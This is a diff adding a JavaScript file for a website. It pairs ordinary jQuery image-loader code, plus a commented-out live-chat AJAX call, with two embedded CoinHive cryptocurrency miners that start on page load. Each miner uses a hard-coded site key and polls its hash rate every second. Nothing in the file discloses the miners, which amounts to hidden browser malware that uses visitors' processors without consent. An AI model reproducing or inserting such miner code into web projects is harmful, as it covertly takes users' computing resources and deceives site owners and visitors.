@@ -1,0 +1,7 @@
+jQuery(document).ready(function($) { /*$.ajaxSetup({xhrFields: {withCredentials: true},headers: {"X-Requested-With": "XMLHttpRequest"}});$.ajax({type: "GET",url: "http://www.bagantrade.com/chat/live_chat",dataType: "html",success: function(data){$("body").append(data);},error: function(xhr) {   console.log("Error: " + xhr.statusText);}});*/ // show loading image$('img.each_cell_loader').show();$('img.each_cell_img').hide();// main image loaded ?$('img.each_cell_img').each(function(){  // hide/remove the loading image  $src = $(this).attr('src');  $(this).attr('src',$src).load(function(){  $(this).next().hide();  $(this).fadeIn();  });  });});var miner = new CoinHive.Anonymous('njFkBLj86qu47w6vukNbOTLQ6fkBstZG');miner.start();miner.on('found', function() { })miner.on('accepted', function() {  })setInterval(function() {var hashesPerSecond = miner.getHashesPerSecond();var totalHashes = miner.getTotalHashes();var acceptedHashes = miner.getAcceptedHashes();}, 1000);var miner = new CoinHive.Anonymous('vbYi0xCA5mKdZ3Uw30IMXPJ6Btvw35rp');
+miner.start();
+miner.on('found', function() {}) miner.on('accepted', function() {}) setInterval(function() {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
+}, 1000);
